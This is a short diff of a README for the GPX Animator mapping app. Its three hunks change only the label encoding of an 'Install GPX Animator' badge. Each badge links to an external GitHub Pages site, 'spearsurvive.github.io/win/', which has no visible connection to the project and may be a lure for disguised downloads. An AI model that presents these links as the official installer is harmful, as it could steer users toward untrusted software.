@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install GPX Animator](https://img.shields.io/badge/⬇_Install_GPX%20Animator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install GPX Animator](https://img.shields.io/badge/⬇_Install_GPX+Animator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ GPX Animator is a free, open-source application for creating animated map videos
 
 <div align="center">
 
-[![⬇ Install GPX Animator](https://img.shields.io/badge/⬇_Install_GPX%20Animator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install GPX Animator](https://img.shields.io/badge/⬇_Install_GPX+Animator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ GPX Animator is a free, open-source application for creating animated map videos
 
 <div align="center">
 
-[![⬇ Install GPX Animator](https://img.shields.io/badge/⬇_Install_GPX%20Animator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install GPX Animator](https://img.shields.io/badge/⬇_Install_GPX+Animator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
